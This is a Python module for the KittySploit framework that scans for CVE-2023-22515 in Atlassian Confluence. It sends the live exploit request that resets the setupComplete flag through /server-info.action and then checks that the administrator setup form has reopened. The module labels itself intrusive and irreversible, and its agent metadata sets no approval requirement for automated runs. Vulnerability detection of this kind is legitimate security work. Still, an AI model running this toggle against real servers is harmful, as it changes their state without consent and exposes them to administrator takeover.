#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Atlassian Confluence CVE-2023-22515 (broken access control / setup reset) detection."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Atlassian Confluence CVE-2023-22515 Detection',
        'description': (
            'Detects CVE-2023-22515 by verifying that setupComplete can be toggled '
            'to re-expose the administrator setup form (no account creation).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2023', 'confluence', 'atlassian',
            'auth-bypass', 'kev', 'vkev', 'vuln', 'intrusive',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': ''},
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-22515',
            'https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html',
        ],
        'cve': 'CVE-2023-22515',
    }

    def run(self):
        setup_path = '/setup/setupadministrator-start.action'
        r1 = self.http_request(method='GET', path=setup_path, allow_redirects=False)
        if not r1:
            return False
        body1 = r1.text or ''
        if 'Setup is already complete' not in body1:
            return False

        toggle = (
            '/server-info.action'
            '?bootstrapStatusProvider.applicationConfig.setupComplete=0'
        )
        r2 = self.http_request(method='GET', path=toggle, allow_redirects=False)
        if not r2:
            return False

        r3 = self.http_request(method='GET', path=setup_path, allow_redirects=False)
        if not r3:
            return False
        body3 = r3.text or ''
        marker = 'Please configure the system administrator account for this Confluence installation'
        if marker not in body3:
            return False

        self.set_info(
            severity='critical',
            reason='Confluence CVE-2023-22515 setupComplete toggle exposed admin setup',
            path=setup_path,
            evidence='setup form reopened after setupComplete=0',
        )
        return True
